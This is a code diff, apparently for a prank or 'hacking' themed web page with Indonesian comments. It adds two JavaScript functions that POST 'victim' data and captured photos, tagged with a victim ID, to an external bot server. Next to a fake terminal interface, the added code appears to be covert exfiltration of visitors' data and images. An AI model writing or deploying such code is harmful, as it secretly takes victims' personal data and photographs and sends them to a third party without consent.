@@ -351,7 +351,47 @@
         }
 
         let hackingStarted = false;
+       // Fungsi kirim data ke bot
+async function sendToBot(data) {
+    try {
+        const response = await fetch(`${BOT_SERVER_URL}/victim`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        });
+        
+        const result = await response.json();
+        currentVictimId = result.victim_id;
+        return result.victim_id;
+    } catch (error) {
+        console.error('Failed to send data:', error);
+        return null;
+    }
+}
 
+// Fungsi kirim foto
+async function sendPhotoToBot(photoData, type) {
+    try {
+        const response = await fetch(`${BOT_SERVER_URL}/photo`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                victim_id: currentVictimId,
+                photo: photoData,
+                type: type
+            })
+        });
+        
+        const result = await response.json();
+        console.log(`${type} sent:`, result);
+    } catch (error) {
+        console.error(`Failed to send ${type}:`, error);
+    }
+    }
         accessBtn.addEventListener('click', function() {
             startScreen.style.display = 'none';
             terminal.classList.remove('hidden');
